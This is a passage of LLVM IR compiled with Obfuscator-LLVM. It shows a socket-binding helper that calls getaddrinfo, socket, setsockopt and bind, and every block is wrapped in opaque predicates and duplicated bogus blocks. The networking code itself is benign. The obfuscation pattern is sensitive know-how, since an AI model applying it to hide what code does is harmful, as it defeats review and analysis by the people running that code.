  %23 = call i32 @getaddrinfo(i8* null, i8* %22, %struct.addrinfo* %12, %struct.addrinfo** %13)
  store i32 %23, i32* %15, align 4
  %24 = load i32, i32* %15, align 4
  %25 = icmp ne i32 %24, 0
  %26 = load i32, i32* @x.21
  %27 = load i32, i32* @y.22
  %28 = sub i32 %26, 1
  %29 = mul i32 %26, %28
  %30 = urem i32 %29, 2
  %31 = icmp eq i32 %30, 0
  %32 = icmp slt i32 %27, 10
  %33 = or i1 %31, %32
  br i1 %33, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %25, label %34, label %39

; <label>:34:                                     ; preds = %originalBBpart2
  %35 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %36 = load i32, i32* %15, align 4
  %37 = call i8* @gai_strerror(i32 %36) #7
  %38 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %35, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.119, i32 0, i32 0), i8* %37)
  store i32 -1, i32* %10, align 4
  br label %204

; <label>:39:                                     ; preds = %originalBBpart2
  %40 = load i32, i32* @x.21
  %41 = load i32, i32* @y.22
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %39
  %48 = load %struct.addrinfo*, %struct.addrinfo** %13, align 8
  store %struct.addrinfo* %48, %struct.addrinfo** %14, align 8
  %49 = load i32, i32* @x.21
  %50 = load i32, i32* @y.22
  %51 = sub i32 %49, 1
  %52 = mul i32 %49, %51
  %53 = urem i32 %52, 2
  %54 = icmp eq i32 %53, 0
  %55 = icmp slt i32 %50, 10
  %56 = or i1 %54, %55
  br i1 %56, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %57

; <label>:57:                                     ; preds = %originalBBpart216, %originalBBpart24
  %58 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %59 = icmp ne %struct.addrinfo* %58, null
  br i1 %59, label %60, label %147

; <label>:60:                                     ; preds = %57
  %61 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %62 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %61, i32 0, i32 1
  %63 = load i32, i32* %62, align 4
  %64 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 2
  %66 = load i32, i32* %65, align 8
  %67 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %68 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %67, i32 0, i32 3
  %69 = load i32, i32* %68, align 4
  %70 = call i32 @socket(i32 %63, i32 %66, i32 %69) #7
  store i32 %70, i32* %16, align 4
  %71 = load i32, i32* %16, align 4
  %72 = icmp eq i32 %71, -1
  br i1 %72, label %73, label %74

; <label>:73:                                     ; preds = %60
  br label %127

; <label>:74:                                     ; preds = %60
  store i32 1, i32* %17, align 4
  %75 = load i32, i32* %16, align 4
  %76 = bitcast i32* %17 to i8*
  %77 = call i32 @setsockopt(i32 %75, i32 1, i32 2, i8* %76, i32 4) #7
  %78 = icmp eq i32 %77, -1
  br i1 %78, label %79, label %96

; <label>:79:                                     ; preds = %74
  %80 = load i32, i32* @x.21
  %81 = load i32, i32* @y.22
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %79
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.120, i32 0, i32 0))
  %88 = load i32, i32* @x.21
  %89 = load i32, i32* @y.22
  %90 = sub i32 %88, 1
  %91 = mul i32 %88, %90
  %92 = urem i32 %91, 2
  %93 = icmp eq i32 %92, 0
  %94 = icmp slt i32 %89, 10
  %95 = or i1 %93, %94
  br i1 %95, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %96

; <label>:96:                                     ; preds = %originalBBpart28, %74
  %97 = load i32, i32* @x.21
  %98 = load i32, i32* @y.22
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %96
  %105 = load i32, i32* %16, align 4
  %106 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %107 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %106, i32 0, i32 5
  %108 = load %struct.sockaddr*, %struct.sockaddr** %107, align 8
  %109 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %110 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %109, i32 0, i32 4
  %111 = load i32, i32* %110, align 8
  %112 = call i32 @bind(i32 %105, %struct.sockaddr* %108, i32 %111) #7
  store i32 %112, i32* %15, align 4
  %113 = load i32, i32* %15, align 4
  %114 = icmp eq i32 %113, 0
  %115 = load i32, i32* @x.21
  %116 = load i32, i32* @y.22
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br i1 %114, label %123, label %124

; <label>:123:                                    ; preds = %originalBBpart212
  br label %147

; <label>:124:                                    ; preds = %originalBBpart212
  %125 = load i32, i32* %16, align 4
  %126 = call i32 @close(i32 %125)
  br label %127

; <label>:127:                                    ; preds = %124, %73
  %128 = load i32, i32* @x.21
  %129 = load i32, i32* @y.22
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %127
  %136 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %137 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %136, i32 0, i32 7
  %138 = load %struct.addrinfo*, %struct.addrinfo** %137, align 8
  store %struct.addrinfo* %138, %struct.addrinfo** %14, align 8
  %139 = load i32, i32* @x.21
  %140 = load i32, i32* @y.22
  %141 = sub i32 %139, 1
  %142 = mul i32 %139, %141
  %143 = urem i32 %142, 2
  %144 = icmp eq i32 %143, 0
  %145 = icmp slt i32 %140, 10
  %146 = or i1 %144, %145
  br i1 %146, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %57

; <label>:147:                                    ; preds = %123, %57
  %148 = load i32, i32* @x.21
  %149 = load i32, i32* @y.22
  %150 = sub i32 %148, 1
  %151 = mul i32 %148, %150
  %152 = urem i32 %151, 2
  %153 = icmp eq i32 %152, 0
  %154 = icmp slt i32 %149, 10
  %155 = or i1 %153, %154
  br i1 %155, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %147
  %156 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %157 = icmp eq %struct.addrinfo* %156, null
  %158 = load i32, i32* @x.21
  %159 = load i32, i32* @y.22
  %160 = sub i32 %158, 1
  %161 = mul i32 %158, %160
  %162 = urem i32 %161, 2
  %163 = icmp eq i32 %162, 0
  %164 = icmp slt i32 %159, 10
  %165 = or i1 %163, %164
  br i1 %165, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %157, label %166, label %185

; <label>:166:                                    ; preds = %originalBBpart220
  %167 = load i32, i32* @x.21
  %168 = load i32, i32* @y.22
  %169 = sub i32 %167, 1
  %170 = mul i32 %167, %169
  %171 = urem i32 %170, 2
  %172 = icmp eq i32 %171, 0
  %173 = icmp slt i32 %168, 10
  %174 = or i1 %172, %173
  br i1 %174, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %166
  %175 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %176 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %175, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.121, i32 0, i32 0))
  store i32 -1, i32* %10, align 4
  %177 = load i32, i32* @x.21
  %178 = load i32, i32* @y.22
  %179 = sub i32 %177, 1
  %180 = mul i32 %177, %179
  %181 = urem i32 %180, 2
  %182 = icmp eq i32 %181, 0
  %183 = icmp slt i32 %178, 10
  %184 = or i1 %182, %183
  br i1 %184, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %204

; <label>:185:                                    ; preds = %originalBBpart220
  %186 = load i32, i32* @x.21
  %187 = load i32, i32* @y.22
  %188 = sub i32 %186, 1
  %189 = mul i32 %186, %188
  %190 = urem i32 %189, 2
  %191 = icmp eq i32 %190, 0
  %192 = icmp slt i32 %187, 10
  %193 = or i1 %191, %192
  br i1 %193, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %185
  %194 = load %struct.addrinfo*, %struct.addrinfo** %13, align 8
  call void @freeaddrinfo(%struct.addrinfo* %194) #7
  %195 = load i32, i32* %16, align 4
  store i32 %195, i32* %10, align 4
  %196 = load i32, i32* @x.21
  %197 = load i32, i32* @y.22
  %198 = sub i32 %196, 1
  %199 = mul i32 %196, %198
  %200 = urem i32 %199, 2
  %201 = icmp eq i32 %200, 0
  %202 = icmp slt i32 %197, 10
  %203 = or i1 %201, %202
  br i1 %203, label %originalBBpart228, label %originalBB26alteredBB

originalBBpart228:                                ; preds = %originalBB26
  br label %204

; <label>:204:                                    ; preds = %originalBBpart228, %originalBBpart224, %34
  %205 = load i32, i32* %10, align 4
  ret i32 %205

originalBBalteredBB:                              ; preds = %originalBB, %1
  %206 = alloca i32, align 4
  %207 = alloca i8*, align 8
  %208 = alloca %struct.addrinfo, align 8
  %209 = alloca %struct.addrinfo*, align 8
  %210 = alloca %struct.addrinfo*, align 8
  %211 = alloca i32, align 4
  %212 = alloca i32, align 4
  %213 = alloca i32, align 4
  store i8* %0, i8** %207, align 8
  %214 = bitcast %struct.addrinfo* %208 to i8*
  call void @llvm.memset.p0i8.i64(i8* %214, i8 0, i64 48, i32 8, i1 false)
  %215 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %208, i32 0, i32 1
  store i32 0, i32* %215, align 4
  %216 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %208, i32 0, i32 2
  store i32 1, i32* %216, align 8
  %217 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %208, i32 0, i32 0
  store i32 1, i32* %217, align 8
  %218 = load i8*, i8** %207, align 8
  %219 = call i32 @getaddrinfo(i8* null, i8* %218, %struct.addrinfo* %208, %struct.addrinfo** %209)
  store i32 %219, i32* %211, align 4
  %220 = load i32, i32* %211, align 4
  %221 = icmp ne i32 %220, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %39
  %222 = load %struct.addrinfo*, %struct.addrinfo** %13, align 8
  store %struct.addrinfo* %222, %struct.addrinfo** %14, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %79
  call void @perror(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.120, i32 0, i32 0))
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %96
  %223 = load i32, i32* %16, align 4
  %224 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %225 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %224, i32 0, i32 5
  %226 = load %struct.sockaddr*, %struct.sockaddr** %225, align 8
  %227 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %228 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %227, i32 0, i32 4
  %229 = load i32, i32* %228, align 8
  %230 = call i32 @bind(i32 %223, %struct.sockaddr* %226, i32 %229) #7
  store i32 %230, i32* %15, align 4
  %231 = load i32, i32* %15, align 4
  %232 = icmp eq i32 %231, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %127
  %233 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %234 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %233, i32 0, i32 7
  %235 = load %struct.addrinfo*, %struct.addrinfo** %234, align 8
  store %struct.addrinfo* %235, %struct.addrinfo** %14, align 8
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %147
  %236 = load %struct.addrinfo*, %struct.addrinfo** %14, align 8
  %237 = icmp eq %struct.addrinfo* %236, null
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %166
  %238 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %239 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %238, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.121, i32 0, i32 0))
  store i32 -1, i32* %10, align 4
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %185
  %240 = load %struct.addrinfo*, %struct.addrinfo** %13, align 8
  call void @freeaddrinfo(%struct.addrinfo* %240) #7
  %241 = load i32, i32* %16, align 4
  store i32 %241, i32* %10, align 4
  br label %originalBB26
}

; Function Attrs: noreturn nounwind
declare void @abort() #6

; Function Attrs: nounwind
declare i32 @epoll_create1(i32) #3

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #7

declare i32 @getaddrinfo(i8*, i8*, %struct.addrinfo*, %struct.addrinfo**) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32) #3

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #3

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo*) #3

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { argmemonly nounwind }
attributes #5 = { nounwind readnone "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #6 = { noreturn nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #7 = { nounwind }
attributes #8 = { nounwind readonly }
attributes #9 = { nounwind readnone }
attributes #10 = { noreturn nounwind }

!llvm.ident = !{!0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
